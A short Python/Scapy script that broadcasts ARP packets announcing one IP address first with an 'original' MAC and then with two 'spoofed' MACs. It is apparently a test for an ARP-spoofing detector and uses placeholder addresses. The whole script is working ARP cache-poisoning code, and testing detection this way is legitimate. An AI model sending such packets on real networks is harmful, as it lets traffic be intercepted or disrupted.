from scapy.all import *
# setting original IP and MAC
sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="99.99.99.99", psrc="11.11.11.11", hwsrc="aa:aa:aa:aa:aa:aa"))

# then spoofed ARP with same IP but different MAC
sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="99.99.99.99", psrc="11.11.11.11", hwsrc="bb:bb:bb:bb:bb:bb"))

# 2nd spoof
sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="99.99.99.99", psrc="11.11.11.11", hwsrc="cc:cc:cc:cc:cc:cc"))